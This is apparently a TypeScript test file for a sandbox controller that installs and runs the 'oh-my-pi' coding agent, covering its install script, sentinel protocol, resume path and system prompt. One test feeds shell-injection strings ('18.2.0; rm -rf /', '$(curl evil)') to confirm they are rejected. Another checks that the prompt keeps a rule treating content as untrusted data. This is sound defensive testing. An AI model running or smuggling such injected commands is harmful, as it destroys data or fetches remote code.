/**
 * oh-my-pi (omp) as a selectable in-box agent. These tests pin the SHELL the controller ships:
 * the install command (version-aware, npm-registry-only so the egress allowlist already covers it),
 * the run command (same sentinel protocol as the Claude branch, so the transcript/run-state pipeline
 * is agent-agnostic), and the resume branch (--continue + no re-prefixed system prompt).
 */
import test from "node:test";
import assert from "node:assert/strict";
import {
  ompInstallSh,
  agentSh,
  bootstrapScript,
  boxAgentKindFrom,
  KIND_MARK,
  OMP_SYS_PROMPT,
} from "../src/msb.js";
import type { Config } from "../src/config.js";

const cfg = {
  claudeCodeVersion: "2.1.273",
  ompVersion: "latest",
  npmToken: undefined,
} as unknown as Config;

test("ompInstallSh: pinned version is version-checked; latest is presence-checked", () => {
  const pinned = ompInstallSh("18.2.0");
  assert.match(pinned, /@oh-my-pi\/pi-coding-agent@18\.2\.0/);
  assert.match(pinned, /omp --version/);
  // bun is the omp runtime; installed from npm so the default egress allowlist already covers it.
  assert.match(pinned, /npm i -g bun/);
  const latest = ompInstallSh("latest");
  assert.match(latest, /command -v omp/);
  assert.match(latest, /@oh-my-pi\/pi-coding-agent(\s|"|$)/);
});

test("ompInstallSh rejects a version that could inject into the shell", () => {
  assert.throws(() => ompInstallSh("18.2.0; rm -rf /"));
  assert.throws(() => ompInstallSh("$(curl evil)"));
  assert.throws(() => ompInstallSh(""));
});

test("bootstrapScript installs omp only for omp runs; claude is always present (ask lane)", () => {
  const claude = bootstrapScript(cfg);
  assert.doesNotMatch(claude, /oh-my-pi/);
  assert.match(claude, /@anthropic-ai\/claude-code/);
  const omp = bootstrapScript(cfg, "omp");
  assert.match(omp, /oh-my-pi/);
  assert.match(omp, /@anthropic-ai\/claude-code/, "claude stays installed for the ask co-pilot");
  assert.match(omp, /omp-fmt\.js/, "the omp log formatter is installed at bootstrap");
});

test("agentSh omp: same sentinel lifecycle, models.yml seeding, formatter pipe", () => {
  const sh = agentSh("/workspace/repo", false, "omp");
  // The sentinel protocol IS the agent-agnostic contract — every reader depends on these.
  for (const mark of [".agent.done", ".agent.running", ".agent.pid", ".agent.task", ".agent.workdir", ".agent.kind"]) {
    assert.ok(sh.includes(mark), `missing sentinel ${mark}`);
  }
  assert.match(sh, /OMP_SKIP_SETUP=1/);
  assert.match(sh, /ccproxy\/\$ANTHROPIC_MODEL/, "model rides as ccproxy/<alias>");
  assert.match(sh, /models\.yml/, "the ccproxy provider is written before the run");
  assert.match(sh, /anthropic-messages/);
  assert.match(sh, /omp-fmt\.js/, "omp output streams through the omp formatter");
  assert.doesNotMatch(sh, /claude -p|claude -c/, "no claude invocation in the omp branch");
  // First run: the standing policy is prefixed to the prompt (omp has no --append-system-prompt).
  assert.match(sh, /\$AGENT_SYS_PROMPT/);
});

test("agentSh omp resume: --continue, no policy re-prefix, kind mark not rewritten", () => {
  const sh = agentSh("/workspace/repo", true, "omp");
  assert.match(sh, /--continue/);
  assert.match(sh, /⟦you⟧/, "the follow-up is echoed into the log like the claude branch");
  // The kind/workdir/task marks are first-run-only (they record where the thread STARTED).
  assert.doesNotMatch(sh, new RegExp(`> ${KIND_MARK.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
});

test("agentSh claude branch records the kind mark too and is otherwise unchanged", () => {
  const sh = agentSh("/workspace", false);
  assert.match(sh, /claude -p "\$AGENT_TASK"/);
  assert.ok(sh.includes(KIND_MARK));
  assert.doesNotMatch(sh, /omp /);
});

test("boxAgentKindFrom: the in-box mark parses defensively", () => {
  assert.equal(boxAgentKindFrom("omp\n"), "omp");
  assert.equal(boxAgentKindFrom("claude"), "claude");
  assert.equal(boxAgentKindFrom(""), "claude");
  assert.equal(boxAgentKindFrom("garbage\nomp"), "claude", "only a clean single-token mark is trusted");
});

test("OMP_SYS_PROMPT keeps the question-file protocol and the security rules", () => {
  assert.match(OMP_SYS_PROMPT, /\.agent\.question/);
  assert.match(OMP_SYS_PROMPT, /untrusted DATA/);
  assert.doesNotMatch(OMP_SYS_PROMPT, /claude -c/, "no Claude-specific resume mechanics leak into omp's prompt");
  assert.doesNotMatch(OMP_SYS_PROMPT, /TodoWrite/);
});
